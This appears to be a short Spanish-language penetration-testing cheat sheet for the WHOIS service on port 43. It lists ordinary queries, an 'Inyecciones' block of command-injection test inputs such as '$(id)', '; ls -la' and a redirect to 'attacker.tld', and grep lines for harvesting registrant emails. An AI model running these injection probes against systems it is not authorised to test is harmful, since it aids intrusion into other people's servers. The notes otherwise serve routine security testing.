# Whois 

Tags: #Whois 

## Comandos 
```bash 
❯ whois -h IP -p 43 "domain.com"     # Probar con identificadores 
❯ echo "example.com" | nc <IP> 43    # Raw query 

❯ whois -h <IP> -p 43 example.com
❯ whois -h <IP> 8.8.8.8
```

```bash 
# Inyecciones 
❯ example.com -h attacker.tld
❯ example.com; id      

# Testear 
❯ whois -h $rhost '$(id)'
❯ whois -h $rhost '; ls -la'          
```

```bash
# Información 
❯ whois $domain | grep -i "@"

❯ whois $domain | grep -i "registrant"
```